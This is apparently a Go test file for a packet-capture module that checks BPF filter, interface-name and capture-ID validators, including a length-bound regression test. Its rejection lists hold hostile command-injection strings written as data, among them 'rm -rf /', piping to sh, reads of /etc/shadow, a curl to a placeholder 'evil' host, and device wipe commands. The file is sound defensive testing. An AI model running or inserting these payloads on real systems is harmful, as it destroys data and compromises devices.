// SPDX-License-Identifier: Apache-2.0
// Copyright 2026 Correlix

package pcap

import (
	"strings"
	"testing"
)

// bpf_test.go — the grammar is the injection boundary, so it gets the most
// hostile test in the module. Every canary below is a real technique: shell
// command substitution, statement separators, pipes, redirection, quote
// breakout, newline injection into a device CLI, and comment-out.

func TestBPFGrammarAcceptsValidFilters(t *testing.T) {
	for _, tc := range []struct{ in, want string }{
		{"host 10.1.2.3", "host 10.1.2.3"},
		{"HOST 10.1.2.3", "host 10.1.2.3"},
		{"net 10.0.0.0/8", "net 10.0.0.0/8"},
		{"port 443", "port 443"},
		{"portrange 1000-2000", "portrange 1000-2000"},
		{"tcp and port 22", "tcp and port 22"},
		{"tcp   and    port 22", "tcp and port 22"},
		{"udp or icmp", "udp or icmp"},
		{"not port 22", "not port 22"},
		{"(tcp and port 80) or (udp and port 53)", "( tcp and port 80 ) or ( udp and port 53 )"},
		{"src host 10.1.2.3 and dst port 443", "src host 10.1.2.3 and dst port 443"},
		{"host 2001:db8::1", "host 2001:db8::1"},
		{"net 2001:db8::/32", "net 2001:db8::/32"},
		{"vlan 100", "vlan 100"},
		{"ip6 and tcp", "ip6 and tcp"},
		{"", ""},
		{"   ", ""},
	} {
		got, err := ValidateFilter(tc.in)
		if err != nil {
			t.Errorf("ValidateFilter(%q) = error %v, want it accepted", tc.in, err)
			continue
		}
		if got != tc.want {
			t.Errorf("ValidateFilter(%q) = %q, want %q", tc.in, got, tc.want)
		}
	}
}

// injectionCanaries are the payloads that must NEVER survive validation. If any
// one of these is accepted, a rendered command carries an operator-supplied
// shell/CLI construct to a production device.
var injectionCanaries = []string{
	"host 1.2.3.4; rm -rf /",
	"host 1.2.3.4 && reboot",
	"host 1.2.3.4 | sh",
	"host $(reboot)",
	"host `reboot`",
	"host ${IFS}reboot",
	"host 1.2.3.4\nconfigure terminal",
	"host 1.2.3.4\rreload",
	"host 1.2.3.4 > /etc/passwd",
	"host 1.2.3.4 < /etc/shadow",
	`host 1.2.3.4" ; reload ; "`,
	"host 1.2.3.4' ; reload ; '",
	"host 1.2.3.4 # comment",
	"host 1.2.3.4 -- comment",
	`host 1.2.3.4\; reload`,
	"host *",
	"host ../../etc/passwd",
	"port 22 ; write erase",
	"tcp && curl http://evil/x",
	"host 1.2.3.4 $USER",
	"host 1.2.3.4%0Areload",
	"exec reload",
	"bash -c id",
	"host 1.2.3.4 and system",
	"' OR 1=1 --",
	"host 999.999.999.999",
	"port 70000",
	"port -1",
	"port +80",
	"portrange 2000-1000",
	"net 10.0.0.0/99",
	"vlan 9999",
	"host",
	"and host 1.2.3.4",
	"host 1.2.3.4 and",
	"(host 1.2.3.4",
	"host 1.2.3.4)",
	"src and dst",
	"tcp tcp",
	"not",
}

func TestBPFGrammarRejectsInjectionCanaries(t *testing.T) {
	for _, canary := range injectionCanaries {
		got, err := ValidateFilter(canary)
		if err == nil {
			t.Errorf("INJECTION ACCEPTED: ValidateFilter(%q) returned %q with no error", canary, got)
		}
		if got != "" {
			t.Errorf("ValidateFilter(%q) returned %q alongside an error — a refused filter must yield nothing", canary, got)
		}
	}
}

func TestBPFGrammarRejectsOverlongFilter(t *testing.T) {
	long := "host 10.1.2.3 and " + strings.Repeat("port 80 and ", 200) + "port 81"
	if _, err := ValidateFilter(long); err == nil {
		t.Fatal("an over-length filter was accepted — the §9 bound is not enforced")
	}
	// Just under the character cap but with too many terms.
	many := strings.TrimSuffix(strings.Repeat("tcp or ", 40), " or ")
	if len(many) <= MaxFilterLen {
		if _, err := ValidateFilter(many); err == nil {
			t.Fatal("a filter with too many terms was accepted")
		}
	}
}

func TestInterfaceGrammar(t *testing.T) {
	for _, ok := range []string{
		"GigabitEthernet0/0/1", "Ethernet1/1", "ge-0/0/0.100", "xe-0/0/0:1",
		"et1", "Vlan100", "Port-Channel1", "eth0",
	} {
		if _, err := ValidateInterface(ok); err != nil {
			t.Errorf("ValidateInterface(%q) = %v, want accepted", ok, err)
		}
	}
	for _, bad := range []string{
		"", "  ", "0/0", "-eth0", "eth0; reboot", "eth0 && id", "eth0|sh",
		"eth0`id`", "eth0$(id)", "eth0\nreload", "eth0 eth1", "../../etc/passwd",
		"eth0'", `eth0"`, "eth0*", strings.Repeat("e", MaxInterfaceLen+1),
	} {
		if got, err := ValidateInterface(bad); err == nil {
			t.Errorf("INJECTION ACCEPTED: ValidateInterface(%q) returned %q", bad, got)
		}
	}
}

func TestCaptureIDGrammar(t *testing.T) {
	if !ValidateCaptureID("0123456789abcdef0123456789abcdef") {
		t.Fatal("a well-formed capture id was rejected")
	}
	for _, bad := range []string{
		"", "short", "0123456789ABCDEF0123456789ABCDEF", // upper hex is not the minted spelling
		"0123456789abcdef0123456789abcde", "0123456789abcdef0123456789abcdefg",
		"../../../etc/passwd", "0123456789abcdef0123456789abcde/",
	} {
		if ValidateCaptureID(bad) {
			t.Errorf("ValidateCaptureID(%q) = true, want false", bad)
		}
	}
}

// TestBPFCanonicalRenderingIsBoundedAndIdempotent is the 3.5-10 regression.
//
// ValidateFilter bounds the RAW text but RETURNS the canonical rendering, and
// tokenizeFilter makes each parenthesis its own space-separated token — so the
// canonical form is LONGER than the input. Bounding only the input let a filter
// through the request gate that the identical re-check in prepareRequest then
// refused, deep inside the run body, quoting a length the operator never typed.
// A validator at a trust boundary must be idempotent: what it accepts, it must
// accept again.
func TestBPFCanonicalRenderingIsBoundedAndIdempotent(t *testing.T) {
	// 15 × "(broadcast)or" + "(broadcast)": 206 raw characters (inside the
	// bound), 63 tokens (inside the 64-term bound), nesting depth 1 (inside the
	// 8-level bound) — and 268 characters once rendered canonically.
	dense := strings.Repeat("(broadcast)or", 15) + "(broadcast)"
	if len(dense) > MaxFilterLen {
		t.Fatalf("the fixture is %d raw characters — it must be <= %d or it proves nothing", len(dense), MaxFilterLen)
	}
	if got := len(strings.Join(tokenizeFilter(dense), " ")); got <= MaxFilterLen {
		t.Fatalf("the fixture renders to %d characters — it must exceed %d or it proves nothing", got, MaxFilterLen)
	}
	got, err := ValidateFilter(dense)
	if err == nil {
		t.Fatalf("a filter whose canonical rendering is %d characters was ACCEPTED as %q — "+
			"the bound is applied to the wrong string", len(got), got)
	}
	if got != "" {
		t.Errorf("a refused filter must yield nothing, got %q", got)
	}
	if !strings.Contains(err.Error(), "normalised") {
		t.Errorf("the refusal must name what was actually too long: %v", err)
	}

	// Idempotence: everything ValidateFilter accepts, it must accept again —
	// unchanged. This is the property prepareRequest's re-validation depends on.
	for _, in := range []string{
		"host 10.1.2.3", "(tcp and port 80) or (udp and port 53)",
		"not port 22", "src host 10.1.2.3 and dst port 443",
		"((tcp or udp) and port 443) or (icmp and not broadcast)",
		strings.Repeat("(broadcast)or", 10) + "(broadcast)",
	} {
		canon, err := ValidateFilter(in)
		if err != nil {
			t.Errorf("ValidateFilter(%q) = %v, want accepted", in, err)
			continue
		}
		again, err := ValidateFilter(canon)
		if err != nil {
			t.Errorf("ValidateFilter is NOT idempotent: it accepted %q as %q, then refused that: %v", in, canon, err)
			continue
		}
		if again != canon {
			t.Errorf("ValidateFilter is NOT idempotent: %q -> %q -> %q", in, canon, again)
		}
	}
}
